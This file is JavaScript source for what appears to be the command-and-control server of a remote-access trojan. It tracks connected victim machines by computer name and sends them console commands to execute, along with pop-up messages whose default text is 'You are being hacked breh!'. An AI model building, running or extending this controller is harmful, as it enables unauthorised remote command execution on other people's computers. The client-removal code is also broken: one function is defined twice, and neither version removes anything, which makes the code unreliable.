var net = require( 'net' );

module.exports.Server = Server;
module.exports.RemoteClient = RemoteClient;

function RemoteClient( socket ) {

    var self = this;
    self.socket = socket;
    self.computerName;

    function dataCallback( data ) {
        var str = data.toString();

        if( str.indexOf( 'Computer-Name: ' ) != -1 ) {
            self.computerName = str.substring( 15 );
            socket.removeListener( 'data', dataCallback );
        }
    }

    socket.on( 'data', dataCallback );

}

function RemoteClientList() {

    var remoteClients = [];

    this.pushClient = function( remoteClient ) {
        if( remoteClient instanceof RemoteClient ) {
            remoteClients.push( remoteClient );
        }
    }

    this.getClientAt = function( index ) {
        return remoteClients[ index ];
    }

    this.getClient = function( computerName ) {
        var selected = null;
        for( var i = 0; i < remoteClients.length; i++ ) {
            if( remoteClients[ i ].computerName.indexOf( computerName ) != -1 ) {
                selected = remoteClients[ i ];
                break;
            }
        }
        return selected;
    }

    this.removeClient = function( remoteClient ) {
        if( removeClient instanceof RemoteClient ) {
            var removed = null;
            for( var i = 0; i < remoteClients.length; i++ ) {
                if( remoteClients[ i ].computerName.indexOf( remoteClient.computerName ) != -1 ) {
                    removed = remoteClients[ i ];
                    break;
                }
            }
            return removed;
        }
    }

    this.removeClient = function( computerName ) {
        var removed = null;
        for( var i = 0; i < remoteClients.length; i++ ) {
            if( remoteClients[ i ].computerName.indexOf( computerName ) != -1 ) {
                removed = remoteClients[ i ];
                break;
            }
        }
        return removed;
    }

    this.toArray = function() {
        return remoteClients;
    }

}

function Server() {

    var self = this;
    var server;
    var remoteClientList = new RemoteClientList();

    function initServer() {
        server = net.createServer();
    }

    this.close = function() {
        server.close();
    }

    this.getRemoteClients = function() {
        return remoteClientList;
    }

    this.sendConsoleCommand = function( remoteClient, cmdLine ) {
        var options = {};
        options.commandType = 'ConsoleCommand';
        options.cmdLine = cmdLine;

        remoteClient.socket.write( JSON.stringify( options ) );
    }

    this.sendMessageBox = function( remoteClient, options ) {
        options             = options || {};
        options.commandType = 'MessageBoxCommand'
        options.title       = options.title || 'Hello there ' + remoteClient.computerName;
        options.message     = options.message || 'You are being hacked breh!';

        remoteClient.socket.write( JSON.stringify( options ) );
    }

    this.start = function( options, callback ) {
        initServer();

        options      = options || {}
        var port     = options.port || 8080;
        var host     = options.host || 'localhost'
        var callback = callback || function() {}

        server.listen( port, host, callback );

        server.on( 'connection', function( socket ) {
            socket.setNoDelay( true );

            var client = new RemoteClient( socket );
            remoteClientList.pushClient( client );

            console.log( 'We got a connection!' );
            
            socket.on( 'data', function( data ) {
                var str = data.toString();

                if( str.indexOf( 'Computer-Name' ) == -1 ) {
                    console.log( data );
                }
            } );

            socket.on( 'close', function() {
                remoteClientList.removeClient( client );
            } );
        } );
    }

}
